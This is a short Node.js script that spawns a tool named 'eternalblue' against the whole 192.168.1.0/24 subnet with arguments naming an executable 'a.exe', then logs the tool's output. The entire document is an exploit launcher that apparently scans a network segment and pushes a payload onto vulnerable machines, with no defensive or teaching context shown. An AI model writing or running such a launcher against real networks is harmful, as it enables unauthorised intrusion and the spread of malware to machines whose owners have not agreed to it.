const { spawn } = require('child_process');
const ls = spawn('eternalblue', ['192.168.1.0/24', '1', 'a.exe', 'a.exe']);

ls.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});

ls.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});

ls.on('close', (code) => {
  console.log(`child process exited with code ${code}`);
});
